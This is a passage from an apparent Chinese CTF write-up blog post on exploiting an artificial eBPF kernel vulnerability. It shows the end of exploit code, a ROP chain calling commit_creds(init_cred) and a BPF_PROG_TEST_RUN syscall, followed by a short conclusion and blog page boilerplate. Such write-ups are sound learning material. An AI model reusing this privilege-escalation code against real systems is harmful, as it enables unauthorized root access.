class="comment">// init_cred</span></span><br><span class="line">    *rop_chain++ = <span class="number">0xffffffff810c3c50</span>; <span class="comment">// commit_creds</span></span><br><span class="line">    *rop_chain++ = <span class="number">0xffffffff8108e620</span>; <span class="comment">// vfork</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Execute BPF program</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">test_run_attr</span> =</span> &#123;</span><br><span class="line">        .test.prog_fd = prog_fd,</span><br><span class="line">        .test.data_size_in = <span class="number">1024</span>,</span><br><span class="line">        .test.data_in = (<span class="type">uint64_t</span>)data_buf,</span><br><span class="line">        .test.ctx_size_in = <span class="keyword">sizeof</span>(md),</span><br><span class="line">        .test.ctx_in = (<span class="type">uint64_t</span>)&amp;md</span><br><span class="line">    &#125;;</span><br><span class="line">    SYSCHK(syscall(SYS_bpf, BPF_PROG_TEST_RUN, &amp;test_run_attr, <span class="keyword">sizeof</span>(test_run_attr)));</span><br><span class="line">    close(prog_fd);</span><br></pre></td></tr></table></figure>

<h1 id="三-总结"><a href="#三-总结" class="headerlink" title="三. 总结"></a>三. 总结</h1><p>​	本题题目主要是利用了eBPF人造出来的漏洞进行的攻击，通过这个攻击进行学习，可以更加清楚的了解eBPF的原理以及如何利用eBPF的漏洞实现内核态的攻击，希望通过这个漏洞的学习，可以方便我们之后对于内核攻击的深入理解。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">a2ure</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2026</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">a2ure</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">20k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">1:13</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
